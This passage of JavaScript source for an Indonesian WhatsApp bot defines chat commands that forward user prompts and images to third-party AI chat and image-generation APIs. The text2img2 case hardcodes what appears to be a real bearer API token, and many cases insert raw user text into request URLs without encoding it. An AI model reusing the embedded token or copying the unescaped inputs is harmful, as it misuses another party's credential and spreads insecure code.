sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
}
)
}
}
break
case 'prompt': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.search)
let media = await quoted.download()
let urlny = await uploadImage(media)
let sulr = await fetchJson(`https://api.yanzbotz.my.id/api/tools/image-prompt?url=${urlny}&apiKey=${yanzApi}`)
RezzHost.sendMessage(m.chat, {
text: `*RESULT* :\n${sulr.result}\n\n${footer}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `P R O M P T`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'recognize': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.search)
let media = await quoted.download()
let urlny = await uploadImage(media)
let sulr = await fetchJson(`https://api.safone.dev/recognize?image=${urlny}`)
RezzHost.sendMessage(m.chat, {
text: `*RESULT* :\n${sulr.result}\n\n${footer}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `P R O M P T`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'whatanime': {
if (!quoted) throw `Fotonya?`;
if (!/image\/(jpe?g|png)/.test(mime)) throw `Mime ${mime} tidak support`;
let img = await quoted.download();
let upld = await uploadImage(img);
reply(mess.wait);
let json = await fetchJson(`https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(upld)}`);
let { id, idMal, title, synonyms, isAdult } = json.result[0].anilist;
let { filename, episode, similarity, video, image } = json.result[0];
let _result = `*Title :* ${title.romaji} (${title.native})\n*Synonyms :* ${synonyms}\n*Adult :* ${isAdult}\n*Similiarity :* ${(similarity * 100).toFixed(1)}\n*Episode :* ${episode}`;
await RezzHost.sendMessage(m.chat, { image: { url: image }, caption: _result }, { quoted: kalgans });
}
break
case 'midjourny': {
if (!text) return reply(`Masukan Teks`)
reply(mess.search)
let imgd = await Draw(text)
let promptm = `❏  *M I D J O U R N Y*\n\n_*Prompt :*_ ${text}`
let sgb = Buffer.from(imgd, 'base64')
RezzHost.sendImage(m.chat, sgb, promptm, kalgans)
}
break
case 'midjourny2': {
if (!text) return reply(`Masukan Prompt`)
reply(mess.search)
let img = await fetchJson(`https://skizo.tech/api/midjourney/v2?apikey=${skizo}&prompt=${text}&model=`)
let imgd = img.base64
let promptm = `❏  *M I D J O U R N Y*\n\n_*Prompt :*_ ${text}`
let sgb = Buffer.from(imgd, 'base64')
RezzHost.sendImage(m.chat, sgb, promptm, floc)
}
break
case 'simi': {
let res = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${apikey}&text=${text}&badword=true`)
if (res.result) reply(res.result)
}
break

case 'bard': {
if (!text) return reply(`Example: ${prefix + command} siapakah soekarno`)
reply(mess.search)
let d = await fetchJson(`https://ai.system.siputzx.my.id/api/bard?q=${text}`)
RezzHost.sendMessage(m.chat, {
text: d.result,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 B A R D - A I`,
body: '',
thumbnailUrl: 'https://telegra.ph/file/fa943a24aa82946cb2f7f.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'ai-img': {
if (!text) return reply(`Example: ${prefix + command} panda`)
         reply(mess.search)
         let timestamp = speed()
let latensi = speed() - timestamp
         let an = await chApi.aiimg(text)
         for (let i = 0; i < 3; i++) {
      	 let inirwsult = an.aiImageData[Math.floor(Math.random() * an.aiImageData.length)]   
         RezzHost.sendMessage(m.chat, { image: { url: inirwsult.images[0].url }, caption: `${inirwsult.name}\n🍟 *Fetching* : ${latensi.toFixed(4)} ms\n\n${footer}`}, { quoted: kalgans })
         await sleep(1500)
         }
      }
      break
case 'gimage2': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let { googleImage } = require('@bochilteam/scraper')
let timestamp = speed()
let latensi = speed() - timestamp
let json = await googleImage(text)
for (let i = 0; i < 3; i++) {
result = json[Math.floor(Math.random() * json.length)]   
RezzHost.sendMessage(m.chat, { image: { url: result }, caption: `🍟 *Fetching* : ${latensi.toFixed(4)} ms\n\n${footer}`}, { quoted: kalgans })
await sleep(1500)
}
}
break
case 'runphp': {
if (!text) return reply(`Example: ${prefix + command} hello word`)
reply(mess.search)
let data = await fetchJson(`https://api.caliph.biz.id/api/php?q=${text}&apikey=${caliph}`)
reply2(data.result)
}
break
case "chatgpt":
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
if (!text) return m.reply('mau nanya apa ke chatgpt')
var kolbekai = await fetchJson(`https://widipe.com/openai?text=Selalu Panggil saya ${pushname} Yak,${text}`)
var airespon = kolbekai.result
setTimeout(async () => {
}, 1000)
RezzHost.sendMessage(m.chat, {
text: `*${gris}[ Chatgpt ] :${gris}*\n\n${airespon}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: 'C H A T - G P T',
body: '',
thumbnailUrl: 'https://telegra.ph/file/3bbc0d84dd5a4b0e1330e.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: true
}}
})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
break
case 'chatgpt': {
if (!text) return reply(`Example: ${prefix + command} kode 403`)
reply(mess.search)
var kolbekai = await fetchJson(`https://widipe.com/openai?text=Selalu Panggil saya ${pushname} Yak,${text}`)
var airespon = kolbekai
RezzHost.sendMessage(m.chat, {
text: `*${gris}[ Chatgpt ] :${gris}*\n${airespon}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: 'C H A T - G P T',
body: '',
thumbnailUrl: 'https://telegra.ph/file/3bbc0d84dd5a4b0e1330e.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break        
case 'lexicart': {
if (!text) return reply2(`Masukan Prompt`)
await loading()
let old = new Date()
let anu = await fetchJson(`https://vihangayt.me/tools/lexicaart?q=${text}`)
for (let i = 0; i < 5; i++) {
let inirwsult = anu.data[0].images[Math.floor(Math.random() * anu.data[0].images.length)]   
RezzHost.sendMessage(m.chat, { image: { url: inirwsult.url }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(1500)
}
}
break
case 'anything': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
RezzHost.sendMessage(m.chat, { image: { url: `https://nekohime.xyz/api/ai/anything?text=${text}&model=anythingv3&apikey=${ApiNeko}` }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'dalle': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let uw = await fetchJson(`https://skizo.tech/api/dalle3?apikey=${skizo}&prompt=${text}`)
RezzHost.sendMessage(m.chat, { image: { url: uw.url }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'realistic': {
  if (!text)  return reply2(`Masukkan Prompt!\n\nContoh: *${command} a village*`)
  let { realistic } = require('./lib/scrape/realisticc.js')
  let res = await realistic(text)
  let danz = Buffer.from(res, 'base64')
  RezzHost.sendMessage(from, { image: danz, mimetype: 'image/jpeg', caption: `*Prompt :* ${text}\n\n${footer}` }, { quoted: kalgans })
}
break
case 'realistic2': {
  if (!text)  return m.reply(`Masukkan Prompt!\n\nContoh: *${command} a village*`)
  let res = await fetchJson(`https://itzpire.site/ai/realistic?prompt=${text}`)
  RezzHost.sendMessage(from, { image: { url: res.result }, mimetype: 'image/jpeg', caption: `*Prompt :* ${text}\n\n${footer}` }, { quoted: fverif })
}
break
case 'img2pixel': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.getdata)
let old = new Date()
let media = await quoted.download()
let urlny = await uploadImage(media)
let imgg = await fetchJson(`https://api.alyachan.dev/api/topixel?image=${urlny}&apikey=${alya}`)
RezzHost.sendImage(m.chat, imgg.data.url, `🍟 *Fetching* : ${((new Date - old) * 1)} ms`, kalgans)
}
break
case 'text2img2': {
if (!q) return reply(`Usage: ${prefix + command} 1girl`);

function txt2img(prompt) {
  return new Promise(async (resolve, reject) => {
    const api_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2OTY0ODM4MzYsInVzZXJfaWQiOiI2NTFlNDlmYjE4ZDNiNzZjMDQyMjk3NzUifQ.gW46goA2PDifptjkK78J-envYirtRgolRncyehkbCA4";
    const url = "https://api.wizmodel.com/sdapi/v1/txt2img";
    const payload = JSON.stringify({
      "prompt": prompt,
      "steps": 100
    });
    const headers = {
      'content-type': 'application/json',
      'authorization': 'bearer ' + api_key
    };

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: headers,
        body: payload
      });

      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }

      const json = await response.json();
      resolve(json);

    } catch (error) {
      reject(error);
    }
  });
}

RezzHost.sendMessage(m.chat, {
  react: {
    text: '🕛',
    key: m.key,
  }
});

try {
  const result = await txt2img(q);
  const imageBase64 = result.images[0];

  const imageBuffer = Buffer.from(imageBase64, 'base64');

  await RezzHost.sendMessage(m.chat, {
    image: imageBuffer
  }, {
    quoted: m
  });

} catch (err) {
  console.error(err);
  m.reply(err.message || 'An error occurred');
}
}
break
case 'emi': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let emi = await fetchJson(`https://api.justifung.tech/api/emiai?prompt=${text}&apikey=${ifung}`)
RezzHost.sendMessage(m.chat, { image: { url: emi.result }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'dreamshaper': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
RezzHost.sendMessage(m.chat, { image: { url: `https://nekohime.xyz/api/ai/dreamshaper?text=${text}&apikey=${ApiNeko}` }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: m })
}
break
case 'stability-ai': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let stab = await chApi.stabilityai(text)
let result = Buffer.from(stab, 'base64')
RezzHost.sendImage(m.chat, result, `🍟 *Fetching* : ${((new Date - old) * 1)} ms`, kalgans)
}
break
case 'seaart': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
RezzHost.sendMessage(m.chat, { image: { url: `https://api.justifung.tech/api/seaart?prompt=${text}&apikey=${ifung}` }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'pixart': {
if (!text) return reply(`Example: ${prefix + command} model|prompt\n\n\npilih model di bawah ini :\n\n> Cinematic\n> Photographic\n> Anime\n> Manga\n> Digital Art\n> Pixel art\n> Fantasy art\n> Neonpunk\n> 3D Model`)
await loading()
let [model, prompt] = text.split("|")
if (!model) return reply(`pilih model di bawah ini :\n\n> Cinematic\n> Photographic\n> Anime\n> Manga\n> Digital Art\n> Pixel art\n> Fantasy art\n> Neonpunk\n> 3D Model`)
if (!prompt) return reply(`Masukkan prompt`)
let old = new Date()
let pix = await fetchJson(`https://itzpire.site/ai/pixart?image_style=${model}&sampler=DPM-Solver&prompt=${prompt}&negative_prompt=loli`)
RezzHost.sendMessage(m.chat, { image: { url: pix.data.img }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'pixelart': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let url = await fetchJson(`https://itzpire.site/ai/pixelart?prompt=${text}&prompt_negative=loli`)
RezzHost.sendMessage(m.chat, { image: { url: url.result }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'hercai-img': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let url = await fetchJson(`https://itzpire.site/ai/hercai-img?model=v3&prompt=${text}&negative_prompt=loli`)
RezzHost.sendMessage(m.chat, { image: { url: url.data.response }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'prodia': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let url = await fetchJson(`https://itzpire.site/ai/prodia?model=EimisAnimeDiffusion_V1.ckpt%20%5B4f828a15%5D&sampler=DDIM&prompt=${text}&negative_prompt=loli`)
RezzHost.sendMessage(m.chat, { image: { url: url.data.img }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'text2img': {
try {
if (!text) return reply(`Example: ${prefix + command} car`)
await loading()
let json = await chApi.text2img(text)
RezzHost.sendFile(m.chat, json.result, 'done', kalgans)
} catch (e) {
console.log(e)
return falseR()
}
}
break
case '3dr': {
if (!text) return m.reply("Masukan prompt")
const pler = await fetchJson(`https://skizo.tech/api/3dr?apikey=${skizo}&prompt=${text}`)
RezzHost.sendMessage(m.chat,{image:{url:pler.url},caption:"Nihh Kak"},{quoted:m})
}
break
case '3dmodel-ai': {
if (!text) return reply(`Example: ${prefix + command} [prompt]`)
await loading()
let json = await fetchJson(`https://itzpire.site/ai/3dmodel?prompt=${text}&negative_prompt=nsfw`)
RezzHost.sendFile(m.chat, json.result, 'done', kalgans)
}
break
case 'diffusion': {
if (!text) return reply(`Example: ${prefix + command} long hair`)
await loading()
let old = new Date()
RezzHost.sendMessage(m.chat, { image: { url: `https://nekohime.xyz/api/ai/diffusion?text=${text}&apikey=${ApiNeko}` }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'diffusion2': {
if (!text) return reply(`Example: ${prefix + command} long hair`)
reply(mess.getdata)
let old = new Date()
let diff = await fetchJson(`https://skizo.tech/api/sdxl?apikey=${skizo}&prompt=${text}`)
RezzHost.sendMessage(m.chat, { image: { url: diff.url }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'waifudiff': {
if (!text) return reply(`Example: ${prefix + command} long hair`)
reply(mess.getdata)
let old = new Date()
let an = await fetchJson(`https://api.neoxr.my.id/api/waifudiff?q=${text}&apikey=${ApiNx}`)
let teks = `W A I F U  S T A B L E - A I

      ◦‎  ImageSize : ${an.data.image_size}
      ◦‎  Steps : ${an.data.steps}
      ◦‎  Sampler : ${an.data.sampler}
      ◦‎  CfgScale : ${an.data.cfg_scale}
      ◦‎  Seed : ${an.data.seed}
      ◦‎  Date : ${an.data.date}
      ◦‎  Impressions : ${an.data.impressions}
      ◦‎  Prompt : ${an.data.prompt}
      
    
${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `W A I F U D I F F`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
RezzHost.sendMessage(m.chat, { image: { url: an.data.url }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'aiphotolabs': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.getdata)
let res = await fetchJson(`https://itzpire.site/ai/photoleap?prompt=${text}`)
RezzHost.sendMessage(m.chat, { image: { url: res.result }, caption: mess.done }, { quoted: kalgans })
}
break
case 'photoleap': {
if (!text) return reply(`*• Example:* ${prefix + command} blue sea`);
let gpt = await fetchJson(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`${hiasan}*Prompt* : ${text}\n`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: Styles(`${gris}[ P H O T O L E A P ]${gris}\n\n`),
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".photoleap ${text}\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'differentme': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!text) return reply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n ⦿ anime_2d\n ⦿ realistic_custom\n ⦿ only_goth\n ⦿ anime_custom\n ⦿ horror_night\n ⦿ superhero_comic\n ⦿ watercolor\n ⦿ romance_comic\n ⦿ starry_girl\n ⦿ maid_dressing\n ⦿ vintage_newspaper\n ⦿ cartoon_3d\n ⦿ egyptian_pharaoh\n ⦿ doodle\n ⦿ pirate_tale\n ⦿ yearbook\n ⦿ dead_festival\n ⦿ pretty_soldier\n ⦿ pixelart\n ⦿ dark_gothic\n ⦿ school_days\n ⦿ marimo_ronin\n ⦿ christmas_anime\n ⦿ biohazard\n ⦿ bizarre_journey\n ⦿ fire_fist`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(mess.getdata)
const media = await quoted.download()
const anu = await uploadImage(media)
let anja = await fetchJson(`https://skizo.tech/api/aimirror?&apikey=${skizo}&url=${anu}&filter=${text}`)
let capt = anja.time_processing
RezzHost.sendImage(m.chat, anja.generated_image_addresses, `Done Bruh\nWaktu Selesai ${capt}\n\n\n${footer}`, kalgans)
}
break
case 'differentme2': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!text) return reply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n ⦿ 90s_pure_love\n ⦿ hell_note\n ⦿ wing_of_faith\n ⦿ westerns\n ⦿ future_2077\n ⦿ spirited_wind\n ⦿ fairy_tale\n ⦿ stone_age\n ⦿ soft_dream\n ⦿ oil_painting\n ⦿ gta5\n ⦿ color_illusion\n ⦿ barbie_doll\n ⦿ millennial_war\n ⦿ american_comics\n ⦿ cyber\n ⦿ new_worlds_pirate\n ⦿ elf_of_the_rings\n ⦿ ninja_storm\n ⦿ sorcery_clash\n ⦿ devil_child\n ⦿ weather_burglar\n ⦿ duel_master\n ⦿ north_star\n ⦿ lady_widow\n ⦿ bikini\n ⦿ lord_of_realm\n ⦿ dball\n ⦿ fancy_castle\n ⦿ ukiyo-e\n ⦿ barbie_beauty\n ⦿ canvas_anime\n ⦿ summer_festival\n ⦿ cyber_portrait\n ⦿ iron_suit\n ⦿ kyoto_girl\n ⦿ vampire_killer\n ⦿ random_style\n ⦿ fuji_courtyard\n ⦿ abstract_pop_art\n ⦿ space_master\n ⦿ saint_knight\n ⦿ mighty_wizard\n ⦿ immortal_fighters\n ⦿ tears_of_legend\n ⦿ bowtie_detective\n ⦿ legend_warrior\n ⦿ yellow_family\n ⦿ my_hero\n ⦿ blood_of_blue\n ⦿ volleyball\n ⦿ magic_woman\n ⦿ gothic_daughter\n ⦿ mermaid\n ⦿ mother_of_dragons\n ⦿ metal_alchemist\n ⦿ dunk_jam\n ⦿ black_leg\n ⦿ bricks_toy\n ⦿ dogdemon\n ⦿ malefic_witch\n ⦿ tennisgenius\n ⦿ eva_mecha\n ⦿ red_diva\n ⦿ gear_5\n ⦿ immortal_diamond\n ⦿ red_hair\n ⦿ muscle_wizard`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(mess.getdata)
const media = await quoted.download()
const anu = await uploadImage(media)
const img = await fetchJson(`https://skizo.tech/api/aimirrorvip?&apikey=${skizo}&url=${anu}&filter=${text}`) 
const capt = img.time_processing
RezzHost.sendMessage(m.chat, { image: { url: img.generated_image_addresses }, caption: `Done Bruh\nWaktu Selesai ${capt}\n\n\n${footer}`}, { quoted: kalgans})
}
break
case 'ai-real': {
if (!text) throw 'Example: .ai-real highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed'
reply(mess.getdata)
let an = await fetchJson(`https://api.neoxr.my.id/api/ai-real?q=${text}&apikey=${ApiNx}`)
RezzHost.sendImage(m.chat, an.data.url, `Prompt: ${text}`, kalgans)
}
break
case 'ai-pixel': {
if (!text) throw 'Example: .ai-pixel highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed'
reply(mess.getdata)
let an = await fetchJson(`https://api.neoxr.my.id/api/ai-pixel?q=${text}&apikey=${ApiNx}`)
RezzHost.sendImage(m.chat, an.data.url, `Prompt: ${text}`, kalgans)
}
break
case 'animediff': {
if (!text) throw 'Example: .animediff highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed'
reply(mess.getdata)
let mes = await fetchJson(`https://itzpire.site/ai/animediff?prompt=${text}&model=animeGen`)
RezzHost.sendImage(m.chat, mes.result, `Prompt: ${text}`, kalgans)
}
break
case 'animeart': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let emi = await fetchJson(`https://api.maelyn.my.id/api/animeart?prompt=${text}&resolution=Wide&model=anime&apikey=${maelyn}`)
RezzHost.sendMessage(m.chat, { image: { url: emi.result.image.name }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: fcall })
}
break
case 'text2video': {
if (!text) return reply(`Masukan Prompt`)
await loading()
let old = new Date()
let emi = await fetchJson(`https://api.maelyn.my.id/api/txt2video?prompt=${text}&apikey=${maelyn}`)
RezzHost.sendMessage(m.chat, { video: { url: emi.result.name }, caption: `${gris}[ T E X T - T O - V I D E O ]${gris}\n\n${hiasan}*Size* : ${emi.result.size}\n${hiasan}*Expired* : ${emi.result.expired}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fcall })
}
break
case 'mangadiff': {
if (!text) throw 'Example: .animediff highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed'
let manga = await fetchJson(`https://itzpire.site/ai/mangadiff?prompt=${text}`)
RezzHost.sendImage(m.chat, manga.result , `${gris}[ M A N G A - D I F F ]${gris}\n\nPrompt: ${text}`, kalgans)
}
break
case 'promptgen': {
if (!text) return reply(`${systemN} masukan prompt`)
await loading()
let prom = await fetchJson(`https://itzpire.site/ai/promptGen?prompt=${text}`)
RezzHost.sendMessage(m.chat, {
text: `${gris}[ P R O M P T - G E N ]${gris}\n\n_Result :_ ${prom.data}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.tag,
body: '',
thumbnailUrl: "https://telegra.ph/file/562feff049d0dec7d77c4.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'aiscene': {
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply(mess.getdata)
const media = await quoted.download()
const anu = await uploadImage(media)
RezzHost.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/aiscene?url=${anu}&apikey=${skizo}` }, caption: mess.success }, { quoted: kalgans })
}
break
case 'stablediff2': {
if (!text) throw `Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
reply(mess.getdata)
let anu = await fetchJson(`https://itzpire.site/ai/sdxl?prompt=${text}&model=dreamshaperXL10_alpha2.safetensors%20%5Bc8afe2ef%5D&sampler=DPM%2B%2B%20SDE%20Karras&negative_prompt=milf`)
RezzHost.sendImage(m.chat, anu.data.imageUrl, `[ *${anu.data.status}* ]\n${gris}Prompt :${gris} ${text}\n\n\n${footer}`, kalgans)
}
break
case 'stablediff': {
if (!text) return reply(`${command} hijab, beautiful, jumpsuit, face korean, Weight 60kg, 20 year, Cannon, 8K, HDR, eyes same`)
      if (!text.includes(",")) return reply(`Please use the prompt correctly. Use commas *[ , ]* to separate arguments.\n*Example :* ${prefix + command} 1girl, blush, looking to viewer, warm smile`)
      reply(mess.search)
      let { resultImage } = await realistic("absolutereality_v181.safetensors [3d9d4d2b]", text)
      let prompt = `❏  *S T A B L E - D I F*\n\n_*Prompt :*_ ${text}`
      let sgb = Buffer.from(resultImage, 'base64')
      RezzHost.sendImage(m.chat, sgb, prompt, kalgans)
    }
break
case 'recolor': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			reply(mess.search)
			let media = await quoted.download()
			let proses = await remini2(media, "recolor")
			RezzHost.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: kalgans})
			}
			break
case 'dehaze': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			reply(mess.search)
			let media = await quoted.download()
			let proses = await remini2(media, "dehaze")
			RezzHost.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: kalgans})
			}
			break
case 'colorize': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			let remini2 = require('./lib/scrape/remini.js')
			let media = await quoted.download()
			let proses = await remini2.remini(media, "colorize")
			RezzHost.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: kalgans})
			}
			break
case 'you.ai': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://itzpire.site/ai/you?q=${text}`)
await RezzHost.sendMessage(m.chat, {
text: d.result.message,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `Y O U - A I`,
body: '',
thumbnailUrl: `https://tinyurl.com/ykadv8uh`,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
            }
            break
case 'kayy': {
if (/image/.test(mime)) {
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("hanya support gambar");
if (!text) return reply("mau nanya apa sama gambar itu?")
let img = await quoted.download()
let media = await uploadImage(img)
let gem = await fetchJson(`https://itzpire.site/ai/gemini-ai?q=${text}&url=${media}`)
RezzHost.sendMessage(m.chat, {
text: `*[ K A Y Y - A I ]*\n\n${gem.result}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.tag,
body: '',
thumbnailUrl: "https://telegra.ph/file/000a33485724af835505e.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
if (!text) return m.reply(`*[ Example ]* ${prefix+command} hii`)
let name = await RezzHost.getName(m.sender)
  let prompt = `Mulai sekarang nama kamu adalah Kayy, kamu mempunyai sifat yang ramah, lucu, dan suka membantu orang lain, kamu selalu menjawab semua pertanyaan yang di berikan menggunakan bahasa indonesia dan selalu menggunakan kata panggilan aku dan kamu!, kamu adalah ai buatan dari RezzHost yang di buat hanya untuk menjawab semua pertanyaan dengan ramah, dan lawan bicaramu sekarang adalah ${name}, dan kamu merespon pertanyaan di awali dengan kata sapaan sepeti halo di tambahkan dengan ${name}. dan ingat jangan bicara menggunakan kata formal anggap ${name} adalah teman mu.`
let kyy = await fetchJson(`https://itzpire.site/ai/gpt-logic?q=${text}&logic=${prompt}&realtime=true`)
RezzHost.sendMessage(m.chat, {
text: `*[ K A Y Y - A I ]*\n\n${tTeks2}${kyy.data.response}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.tag,
body: '',
thumbnailUrl: "https://telegra.ph/file/000a33485724af835505e.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break
case 'bing2': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://nekohime.xyz/api/ai/bingchat?text=${text}&model=balanced&apikey=${ApiNeko}`)
reply2(d.result.text)
}
break
case 'bing': {
if (!text) return reply('Apa yang kamu ingin ketahui?')
await loading()
let d = await fetchJson(`https://api.kiicodeit.me/ai/bingchat?text=${text}&apikey=${kicode}`)
reply2(d.result)
}
break
case 'hercai': {
if (!text) return reply(`apa yang ingin kamu tanyakan?`)
await loading()
let d = await fetchJson(`https://apiruulzz.my.id/api/hercai?query=${text}`)
reply(d.result.reply)
}
break
case 'gemini-img': {
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("hanya support gambar");
if (!text) return reply("mau nanya apa sama gambar itu?")
let img = await quoted.download()
let media = await uploadImage(img)
let gem = await fetchJson(`https://itzpire.site/ai/gemini-ai?q=${text}&url=${media}`)
reply(`[ G E M I N I - I M A G E ]\n\n${gem.result}`)
}
break
case 'naw':{
if (!text) return reply("mau nanya apa sama naw")
await loading()
let { data } = await axios.get(`https://ai.system.siputzx.my.id/api/gemini-naw?q=${text}`)
reply(data.text)
}
break
case 'gemini':{
if (!text) return reply("mau nanya apa sama gemini")
await loading()
let { data } = await axios.get(`https://ai.system.siputzx.my.id/api/gemini-ask?q=${text}`)
reply(data.text)
}
break
case 'ai-gemini': {
